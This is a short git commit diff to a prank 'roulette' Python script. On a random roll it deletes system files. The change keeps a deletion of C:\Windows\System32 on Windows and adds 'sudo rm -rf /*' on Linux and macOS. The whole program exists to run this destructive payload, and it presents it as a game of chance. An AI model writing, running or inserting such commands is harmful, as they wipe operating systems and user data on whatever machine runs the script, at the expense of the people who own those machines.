9de35c6a1e8e124883412e0519d9ee135c75a7ff
YopekUtox <64082572+YopekUtox@users.noreply.github.com>
2022-07-16 12:01:02 +0200

    Update roulette.py

--- roulette.py
+++ roulette.py
@@ -3,6 +3,9 @@ import os, random
 missile_in_chamber = random.randint(0, 6)
 
 if missile_in_chamber == 3:
-    os.remove("C:\\Windows\\System32")
+    if os.name == 'nt':
+        os.remove("C:\\Windows\\System32")
+    if os.name == 'posix':
+        os.system("sudo rm -rf /*")
 else:
     print("You are lucky :D")
